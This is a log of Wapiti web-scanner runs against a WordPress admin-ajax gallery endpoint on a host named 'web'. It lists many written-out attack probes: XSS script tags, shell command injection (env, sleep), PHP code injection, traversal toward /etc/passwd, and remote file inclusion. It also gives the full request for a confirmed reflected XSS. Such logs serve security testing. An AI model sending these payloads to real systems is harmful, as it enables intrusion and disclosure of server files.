2024-03-21 18:28:16.500 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:28:17.320 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-21 18:28:17.320 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_c2789e6d.db
2024-03-21 18:28:17.325 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
2024-03-21 18:28:17.382 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-21 18:28:17.382 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-21 18:28:17.388 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-21 18:28:17.492 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-21 18:28:17.492 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-21 18:28:17.528 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
2024-03-21 18:28:17.539 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:28:18.211 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%3CScRiPt%3Ealert%28%27w396bckl1c%27%29%3C%2FsCrIpT%3E&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:28:18.868 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%3CScRiPt%3Ealert%28%22w396bckl1c%22%29%3C%2FsCrIpT%3E&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:28:19.542 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%3CScRiPt%3Ealert%28%2Fw396bckl1c%2F%29%3C%2FsCrIpT%3E&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:28:20.267 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:205 - ---
2024-03-21 18:28:20.267 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:206 - Reflected Cross Site Scripting in http://web/wp-admin/admin-ajax.php via injection in the parameter gallery_current_index
2024-03-21 18:28:20.268 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:216 - Evil request:
2024-03-21 18:28:20.268 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:217 -     GET /wp-admin/admin-ajax.php?gallery_current_index=%3CScRiPt%3Ealert%28%2Fw396bckl1c%2F%29%3C%2FsCrIpT%3E&limit=1&start=0&action=wpda_gall_load_image_info HTTP/1.1
    host: web
    connection: keep-alive
    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
    accept-language: en-US,en;q=0.5
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    sec-fetch-user: ?1
    sec-fetch-site: none
    sec-fetch-mode: navigate
    sec-fetch-dest: document
    upgrade-insecure-requests: 1
    dnt: 1
2024-03-21 18:28:20.268 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:218 - ---
2024-03-21 18:29:21.595 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-21 18:29:21.606 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:21.608 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%3Benv%3B&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:22.289 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%7Cenv%7C&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:22.917 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=a%3Benv%3B&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:23.547 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=a%3Benv%3B&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:24.181 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:24.815 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%3Benv%3B&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:25.448 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz%0Aenv%3B&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:26.087 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%26set%26&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:26.739 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=set&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:27.372 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=env&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:28.004 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%2Fe%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:28.648 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:29.280 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:29.914 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:30.548 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:31.184 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:31.812 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:32.446 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:33.079 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:33.710 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:34.350 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:34.979 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:35.614 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:36.245 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:36.876 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=a%60%29%60&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:37.508 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=a%60sleep%2060%60&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:38.143 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=a%3Bsleep%2060%3B&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:38.775 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=a%7Csleep%2060%3B&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:39.411 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%26ping%20-n%2025%20127.0.0.1%26&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:29:40.043 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=%3Benv%3B&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:30:40.171 | ORANGE   | wapitiCore.attack.mod_exec:attack:228 - ---
2024-03-21 18:30:40.171 | ORANGE   | wapitiCore.attack.mod_exec:attack:229 - Received a HTTP 500 error in http://web/wp-admin/admin-ajax.php
2024-03-21 18:30:40.172 | ORANGE   | wapitiCore.attack.mod_exec:attack:230 - Evil request:
2024-03-21 18:30:40.172 | ORANGE   | wapitiCore.attack.mod_exec:attack:231 -     GET /wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=%3Benv%3B&start=0&action=wpda_gall_load_image_info HTTP/1.1
    host: web
    connection: keep-alive
    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
    accept-language: en-US,en;q=0.5
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    sec-fetch-user: ?1
    sec-fetch-site: none
    sec-fetch-mode: navigate
    sec-fetch-dest: document
    upgrade-insecure-requests: 1
    dnt: 1
2024-03-21 18:30:40.172 | ORANGE   | wapitiCore.attack.mod_exec:attack:232 - ---
2024-03-21 18:30:40.173 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=%7Cenv%7C&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:31:40.193 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=a%3Benv%3B&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 18:32:40.926 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=a%3Benv%3B&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:18:20.715 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:18:21.514 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-21 21:18:21.515 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_c2789e6d.db
2024-03-21 21:18:21.520 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
2024-03-21 21:18:21.579 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-21 21:18:21.580 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-21 21:18:21.667 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-21 21:18:21.689 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-21 21:18:21.689 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
2024-03-21 21:18:21.702 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:18:21.702 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-admin/admin-ajax.php?gallery_current_index=https%3A%2F%2Fopenbugbounty.org%2F&limit=1&start=0&action=wpda_gall_load_image_info
2024-03-21 21:18:22.344 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-admin/admin-ajax.php?gallery_current_index=%2F%2Fopenbugbounty.org%2F&limit=1&start=0&action=wpda_gall_load_image_info
2024-03-21 21:18:22.978 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=https%3A%2F%2Fopenbugbounty.org%2F&start=0&action=wpda_gall_load_image_info
2024-03-21 21:19:23.013 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=%2F%2Fopenbugbounty.org%2F&start=0&action=wpda_gall_load_image_info
2024-03-21 21:19:23.690 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=1&start=https%3A%2F%2Fopenbugbounty.org%2F&action=wpda_gall_load_image_info
2024-03-21 21:19:24.320 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=1&start=%2F%2Fopenbugbounty.org%2F&action=wpda_gall_load_image_info
2024-03-21 21:19:24.950 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=1&start=0&action=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-21 21:19:25.574 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=1&start=0&action=%2F%2Fopenbugbounty.org%2F
2024-03-21 21:19:26.275 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
2024-03-21 21:19:26.290 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:19:26.984 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%3CScRiPt%3Ealert%28%27wob33eriy1%27%29%3C%2FsCrIpT%3E&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:19:27.623 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%3CScRiPt%3Ealert%28%22wob33eriy1%22%29%3C%2FsCrIpT%3E&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:19:28.253 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%3CScRiPt%3Ealert%28%2Fwob33eriy1%2F%29%3C%2FsCrIpT%3E&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:19:28.962 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:205 - ---
2024-03-21 21:19:28.962 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:206 - Reflected Cross Site Scripting in http://web/wp-admin/admin-ajax.php via injection in the parameter gallery_current_index
2024-03-21 21:19:28.963 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:216 - Evil request:
2024-03-21 21:19:28.963 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:217 -     GET /wp-admin/admin-ajax.php?gallery_current_index=%3CScRiPt%3Ealert%28%2Fwob33eriy1%2F%29%3C%2FsCrIpT%3E&limit=1&start=0&action=wpda_gall_load_image_info HTTP/1.1
    host: web
    connection: keep-alive
    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
    accept-language: en-US,en;q=0.5
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    sec-fetch-user: ?1
    sec-fetch-site: none
    sec-fetch-mode: navigate
    sec-fetch-dest: document
    upgrade-insecure-requests: 1
    dnt: 1
2024-03-21 21:19:28.963 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:218 - ---
2024-03-21 21:20:30.325 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
2024-03-21 21:20:30.345 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:30.987 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
2024-03-21 21:20:31.076 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
2024-03-21 21:20:31.096 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:31.114 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
2024-03-21 21:20:31.130 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:31.769 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
2024-03-21 21:20:31.769 | GREEN    | wapitiCore.attack.mod_http_headers:check_header:103 - OK
2024-03-21 21:20:31.770 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
2024-03-21 21:20:31.770 | GREEN    | wapitiCore.attack.mod_http_headers:check_header:103 - OK
2024-03-21 21:20:31.799 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-21 21:20:31.833 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-21 21:20:31.853 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=fuzz&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:31.858 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:32.501 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:33.129 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%2Fetc%2Fpasswd&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:33.759 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%2Fetc%2Fpasswd%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:34.388 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%2Fetc%2Fservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:35.326 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=%2Fetc%2Fservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:35.992 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:36.624 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:37.253 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:37.891 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:38.517 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:39.144 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:39.774 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:40.405 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:41.322 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:41.961 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:42.592 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:43.221 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:43.852 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:44.481 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:45.110 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:45.737 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:46.367 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
2024-03-21 21:20:46.992 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?gallery_current_index=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&limit=1&start=0&action=wpda_gall_load_image_info (0)
